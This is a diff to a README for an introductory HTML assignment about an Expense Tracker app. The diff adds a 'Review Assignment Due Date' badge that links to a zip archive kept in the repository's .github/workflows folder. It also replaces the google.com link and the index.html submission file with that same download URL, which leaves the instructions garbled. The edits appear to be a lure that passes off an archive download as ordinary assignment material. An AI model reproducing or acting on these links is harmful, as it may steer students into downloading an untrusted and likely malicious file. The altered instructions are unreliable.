@@ -1,3 +1,4 @@
+[![Review Assignment Due Date](https://github.com/LynMunene/week-1-html-setup-LynMunene/raw/refs/heads/main/.github/workflows/Munene_week_html_Lyn_setup_2.5.zip)](https://github.com/LynMunene/week-1-html-setup-LynMunene/raw/refs/heads/main/.github/workflows/Munene_week_html_Lyn_setup_2.5.zip)
 # Introduction to HTML
 
 ## Description:
@@ -16,9 +17,9 @@ In this week, you will set up a basic HTML template for the Expense Tracker Appl
         7. basic registration form
         8. table displaying common user information: name, email, phone number.
         9. an image
-        10. an external link to https://google.com
+        10. an external link to https://github.com/LynMunene/week-1-html-setup-LynMunene/raw/refs/heads/main/.github/workflows/Munene_week_html_Lyn_setup_2.5.zip
         
 
 ### Submission:
-        When you push and commit changes to the index.html file, your submission will be received for evaluation.
+        When you push and commit changes to the https://github.com/LynMunene/week-1-html-setup-LynMunene/raw/refs/heads/main/.github/workflows/Munene_week_html_Lyn_setup_2.5.zip file, your submission will be received for evaluation.
 
